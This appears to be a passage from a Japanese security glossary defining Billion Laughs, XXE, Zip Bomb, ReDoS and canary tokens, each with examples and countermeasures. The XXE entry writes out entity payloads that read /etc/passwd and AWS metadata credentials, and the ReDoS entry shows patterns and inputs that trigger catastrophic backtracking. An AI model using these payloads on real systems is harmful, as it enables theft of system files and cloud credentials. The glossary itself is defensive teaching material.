2003 年頃に提唱された古典的な攻撃手法。エンティティ名が `lol1`, `lol2`, ... となっており、最終的に `lol` が 10 億個（1 billion = 10^9）生成されることから「Billion Laughs」と名付けられた。OWASP の XML Security チートシートに長年掲載されている定番脆弱性で、SAML や SOAP が主流だった時代から現在の REST + XML 変換系 API まで影響が続いている。

### 対策
- XML パーサーの DTD 処理を無効化する。Java なら `FEATURE_SECURE_PROCESSING` を有効化、`disallow-doctype-decl` を true に設定
- Python では `defusedxml` ライブラリを使用し、標準の `xml.*` モジュールを直接使わない
- エンティティ展開の上限（`entityExpansionLimit`、`maxOccurLimit` など JVM システムプロパティ）を明示的に設定する
- そもそも XML が不要なら JSON に切り替える。SAML のように XML 必須な場合は上記の無効化を徹底する
- API Gateway や WAF でリクエストボディのサイズ上限を設け、DTD 宣言を含むペイロードをブロックする

### 関連用語
- [XXE](#xxexml-external-entity)
- [Zip Bomb](#zip-bomb)
- [ReDoS](#redosregular-expression-denial-of-service)
- [SSRF](#ssrfserver-side-request-forgery)
- [ディフェンス・イン・デプス](design.md#ディフェンスインデプス)

---

## XXE（XML External Entity）

別名: XML 外部実体参照攻撃 / XML External Entity Injection

### 意味
XML 仕様の「外部実体参照」機能を悪用し、XML パーサーにローカルファイル読み取り・内部ネットワークへのリクエスト・DoS を行わせる攻撃。DTD 宣言で `SYSTEM "file:///etc/passwd"` のような外部リソースを参照させ、パーサーがその内容を XML 解析結果に埋め込むことで機密情報が漏洩する。

### よくある例
- `<!ENTITY xxe SYSTEM "file:///etc/passwd">` を含む XML を送信し、`&xxe;` を参照させてレスポンスに `/etc/passwd` の内容を含めさせる
- `<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">` で AWS EC2 のメタデータを窃取（[SSRF](#ssrfserver-side-request-forgery) との合わせ技）
- SAML レスポンスや SOAP リクエストに悪意ある DTD を混入させ、認証プロバイダー側のファイルを読む
- 2017 年に WordPress、Facebook、Apple iWork 等で実際に XXE による情報漏洩が発見されている

### ありがちな症状
- Java の `DocumentBuilderFactory` や PHP の `libxml` がデフォルト設定のまま DTD を解釈している
- SAML / SOAP / SVG / docx / xlsx など「実は XML」なフォーマットを扱うエンドポイントで外部実体が有効
- ファイルアップロード機能が XML ベースのファイル（SVG、Office 文書）を中身の検証なしに処理している
- パース時に「妙に長い時間がかかる」「外部への謎のネットワーク通信が発生する」

### 近い言葉との違い
- [Billion Laughs Attack](#billion-laughs-attack): 同じ XML パーサー設定で防げるが、こちらは DoS 特化で外部通信を伴わない
- [SSRF](#ssrfserver-side-request-forgery): XXE が踏み台になって SSRF に繋がるケースが多い。XXE は XML パーサー内の外部参照経由で発生する点が特徴
- [SQL Injection](#sql-injection): 注入という意味では類似。ただし対象が XML パーサーか SQL エンジンかで異なる

### 背景・語源
OWASP Top 10 2017 で独立カテゴリ「A4: XML External Entities (XXE)」として初めてランクイン（その後 2021 版で「Security Misconfiguration」に統合）。元々 XML 1.0 仕様に存在した正当な機能が、信頼できない入力に対して有効化されたまま運用されることで脆弱性となった。レガシーな SAML / SOAP スタックで今なお発見される。

### 対策
- XML パーサーで DTD / 外部実体を明示的に無効化する
  - Java: `factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`
  - Python: 標準 `xml.*` ではなく [`defusedxml`](https://pypi.org/project/defusedxml/) を使う
  - PHP: `libxml_disable_entity_loader(true)`（PHP 8+ ではデフォルト無効）
- そもそも XML が不要なら JSON に移行する
- SVG・Office 文書をサーバー側で処理する場合、信頼できない XML として DTD 無効化を徹底する
- WAF で外部 DTD 参照を含むペイロードをブロックする

### 関連用語
- [Billion Laughs Attack](#billion-laughs-attack)
- [SSRF](#ssrfserver-side-request-forgery)
- [SQL Injection](#sql-injection)
- [ディフェンス・イン・デプス](design.md#ディフェンスインデプス)

---

## Zip Bomb

別名: ジップボム / Decompression Bomb / 圧縮爆弾

### 意味
展開すると元の数万〜数兆倍のサイズになるよう細工された圧縮ファイルを送り込み、展開側のディスク・メモリを枯渇させる DoS 攻撃。典型例の `42.zip` はわずか 42 KB で展開後 4.5 PB（ペタバイト）になる。ZIP だけでなく gzip、bzip2、PNG など任意の圧縮フォーマットで成立しうる。

### よくある例
- ウイルススキャナーやメールフィルタに巨大化する zip を食わせ、サーバーを停止させる
- 画像アップロード機能に「表向き小さな PNG」を投げ、サーバー側の画像ライブラリが展開時に OOM で落ちる
- CI の Artifact 展開で信頼できない zip を解凍し、ランナーのディスクが埋まる
- S3 にアップロードされた zip を Lambda が自動展開する構成で、1 ファイルで Lambda のエフェメラルストレージを埋め尽くす

### ありがちな症状
- アップロード処理中にワーカープロセスが OOMKilled される
- 「/tmp が満杯」「inode 枯渇」でサービス全体が停止する
- 展開処理にタイムアウトや容量上限がない
- ネスト圧縮（zip of zip of zip...）の検査が行われていない

### 近い言葉との違い
- [Billion Laughs Attack](#billion-laughs-attack): XML 実体参照版の展開爆弾。原理は同じだがフォーマットとパーサーが異なる
- [ReDoS](#redosregular-expression-denial-of-service): CPU を焼く DoS。Zip Bomb はディスク/メモリを焼く
- Fork Bomb: プロセス数を枯渇させる DoS。こちらは OS レベルの資源枯渇攻撃

### 背景・語源
1990 年代末から存在する古典的攻撃。代表例 `42.zip`（AERAsec 社公開）は 16 層ネストの zip で 4.3 × 10^9 倍に展開される。現代では単層でも展開比が極端に大きい「gzip bomb」「PNG bomb」なども使われ、画像処理ライブラリ（ImageMagick）や PDF パーサーを落とす用途で悪用される。

### 対策
- 展開サイズに上限を設け、ストリーム処理で閾値超過を検知したら中断する（Python なら `zipfile.ZipFile` の `file_size` を事前チェック）
- 展開深さ（ネスト階層）にも上限を設ける
- 信頼できないファイルは隔離されたサンドボックス（cgroup で memory/disk 制限、Lambda の短命環境など）で処理する
- 画像は ImageMagick の `resource limits`（`-limit memory`、`-limit disk`）で制約する
- アンチウイルス・メールゲートウェイは展開比やネスト数で検疫する

### 関連用語
- [Billion Laughs Attack](#billion-laughs-attack)
- [ReDoS](#redosregular-expression-denial-of-service)
- [バルクヘッド](operations.md#バルクヘッド)
- [レートリミット](operations.md#レートリミット)

---

## ReDoS（Regular Expression Denial of Service）

別名: 正規表現 DoS / 正規表現爆発 / Catastrophic Backtracking

### 意味
正規表現エンジンのバックトラッキング実装（NFA ベース）の最悪計算量が指数的に膨らむことを悪用し、悪意ある入力文字列でエンジンの CPU を焼き切る DoS 攻撃。脆弱な正規表現（例: `(a+)+$`）に対して `"aaaa...aaaab"` を与えると、マッチ判定に数秒〜数分以上かかり、イベントループがブロックする。

### よくある例
- 2016 年に Stack Overflow が 34 分間ダウンした事例: ホームページ表示のクライアントサイド正規表現が、特定の投稿に含まれる長い空白列で catastrophic backtracking を起こした
- 2019 年の Cloudflare 障害: WAF ルールの正規表現 `(?:(?:\"|'|\]|\}|\\|\d|(?:nan|infinity|true|false|null|undefined|symbol|math)|\`|\-|\+)+[)]*;?((?:\s|-|~|!|{}|\|\||\+)*.*(?:.*=.*)))` が CPU を 100% に張り付かせた
- Node.js のバリデーション（メールアドレス、URL）で脆弱な正規表現を使い、ユーザー入力一発でイベントループが停止する

### ありがちな症状
- 「ネスト量指定子」のある正規表現（`(a+)+`、`(a*)*`、`(a|a)+`）を使っている
- 単一 HTTP リクエストで Node.js / Ruby / Python プロセスの CPU が 100% に張り付き、他のリクエストが詰まる
- APM で「特定のエンドポイントだけ p99 レイテンシが秒オーダー」になっている
- WAF / バリデーションライブラリのバージョンが古く、既知の脆弱パターンが残っている

### 近い言葉との違い
- [Billion Laughs Attack](#billion-laughs-attack) / [Zip Bomb](#zip-bomb): メモリ・ディスクを枯渇させる。ReDoS は CPU を枯渇させる
- Algorithmic Complexity Attack: より広い概念。ReDoS はその特殊ケース。Hash Collision DoS なども同族
- [Thundering Herd](concurrency.md#thundering-herdサンダリングハード): 負荷集中は似るが、こちらは並行制御の問題であり入力による最悪計算量攻撃ではない

### 背景・語源
2003 年に Scott Crosby と Dan Wallach がアルゴリズム複雑性攻撃の一種として論文化。「正規表現エンジンの実装によっては指数時間になる」という理論を実運用での攻撃に結び付けた。Perl / PCRE / JavaScript / Python `re` などバックトラック型の実装が該当し、Go の `regexp` や Rust の `regex` クレートのような RE2 / DFA 系は原理的に影響を受けない。

### 対策
- ネスト量指定子を避け、可能なら所有量指定子（`a++`）やアトミックグループ `(?>...)` を使う
- 入力長に上限を設け、正規表現に渡す前に validate する
- タイムアウト付きマッチを使う（Java の `Matcher.find()` は難しいが、Node.js なら外部プロセスやワーカースレッド、Go なら `context` 付きで）
- 正規表現エンジンを RE2 / Hyperscan など線形時間保証のある実装に切り替える
- CI で [`safe-regex`](https://www.npmjs.com/package/safe-regex) や [`rxxr2`](https://github.com/superhuman/rxxr2) を使い、脆弱パターンを検出する

### 関連用語
- [Billion Laughs Attack](#billion-laughs-attack)
- [Zip Bomb](#zip-bomb)
- [Thundering Herd](concurrency.md#thundering-herdサンダリングハード)
- [バックプレッシャー](operations.md#バックプレッシャー)

---

## カナリアトークン

別名: Canarytoken / Canary Token / ハニートークン（Honeytoken）

### 意味
攻撃者の侵入や情報漏洩を検知するために、システム内に意図的に仕込む「おとり」のトークン・ファイル・認証情報。正規の業務では参照されないため、アクセスや使用が観測された時点で「不正な侵入が起きている」と高い確度で判断できる。検知された瞬間に運用チームへ通知が飛ぶ。炭鉱のカナリア（毒ガスで先に倒れて危険を知らせる）が語源。

### よくある例
- ダミーの AWS アクセスキーをソースコードや設定ファイルに埋め込み、CloudTrail で `GetCallerIdentity` 等の呼び出しを監視する。漏洩したリポジトリを攻撃者がスキャンしてキーを試した瞬間に検知する
- 機密書類風の Word / PDF ファイル（`給与一覧_2026.xlsx` 等）にトラッキング用 URL を仕込み、ファイルサーバーや S3 に配置する。攻撃者が中身を開くと外部 URL にアクセスが飛び、IP・User-Agent が記録される
- データベースに「決して参照されないはずの管理者ユーザー（例: `admin_legacy`）」を仕込み、ログインや SELECT が来たら即アラート
- DNS カナリアトークン（`unique-id.canarytokens.com` 等）を設定ファイルに混ぜ、攻撃者がホスト名解決した瞬間に通知を受け取る
- Thinkst Canary や [canarytokens.org](https://canarytokens.org/)（無料のホスト型サービス）で発行・運用する

### ありがちな症状
- 「侵入されているかどうか」を判断する手段が一切なく、ログイン成功・正常応答だけを監視している
- 漏洩の発覚が外部からの通報や報道経由（数ヶ月〜数年遅れ）で初めて気づく
- カナリアトークンを仕込んでみたが、通知先が個人 Slack や形骸化したメーリスで誰も気づかない
- 正規業務でうっかりトークンを踏んでしまい、誤検知でアラート疲れが起き運用停止される

### 近い言葉との違い
- ハニーポット（Honeypot）: おとりの「システム全体」（脆弱な VM やサーバー）。カナリアトークンは「単一のトークン・ファイル」で軽量・低コスト
- IDS / IPS（侵入検知・防止システム）: シグネチャやアノマリ検知で攻撃を見つける。カナリアトークンは「触られた事実」だけで判定するためフォールスポジティブが極めて少ない
- [Secret Rotation](#secret-rotation): 本物のシークレットを定期更新する。カナリアトークンは「決して使われない偽物のシークレット」を撒く点が逆
- WAF / アンチウイルス: 既知の攻撃パターンを防ぐ。カナリアトークンは検知できなかった侵入が「すでに起きた後」を捕まえる

### 背景・語源
語源は石炭鉱山で毒ガス検知に使われたカナリア（鳥）。古くからセキュリティ分野では「ハニートークン」と呼ばれる概念があったが、2015 年に南アフリカのセキュリティ企業 Thinkst が `canarytokens.org` を公開し、誰でも数クリックで AWS キー風・PDF・DNS など多様なカナリアを発行できるようにしたことで一気に普及した。Cloudflare、Stripe、GitHub など多くの組織が内部監視に採用している。

### 対策
- 通知先は当番制の Slack チャンネルや PagerDuty に接続し、24/365 で誰かが見る状態を維持する
- カナリアの配置場所（S3、SharePoint、リポジトリ、ファイルサーバー、CI/CD 環境）と用途を台帳に残し、正規業務での誤踏みを区別できるようにする
- カナリアキー自体には IAM 権限を一切与えない（誰かが「使う」だけで検知できればよい）。万一悪用されても被害ゼロ
- リポジトリ・設定ファイル・バックアップ・退職者の引き継ぎ書類など「侵入後に攻撃者が漁る場所」に重点的に仕込む
- 半年〜1 年ごとにカナリアの位置と通知パスをローテーションし、攻撃者が学習して回避することを防ぐ
- インシデント対応ランブックに「カナリア発報時の初動」を明記する（誰が何を確認し、どの順で隔離するか）

### 関連用語
- [Secret Rotation](#secret-rotation)
- [Zero Trust](#zero-trust)
- [Supply Chain Attack](#supply-chain-attack)
- [ディフェンス・イン・デプス](design.md#ディフェンスインデプス)
- [Shift Left](testing.md#shift-left)

---

- ※ [Least Privilege (IAM)](aws-iac.md#least-privilege-iam) を参照
- ※ [TOCTOU](concurrency.md#toctou) を参照
- ※ [ディフェンス・イン・デプス](design.md#ディフェンスインデプス) を参照
- ※ [フェイルオープン](design.md#フェイルオープン) / [フェイルクローズ](design.md#フェイルクローズ) を参照
- ※ [Shift Left](testing.md#shift-left) を参照
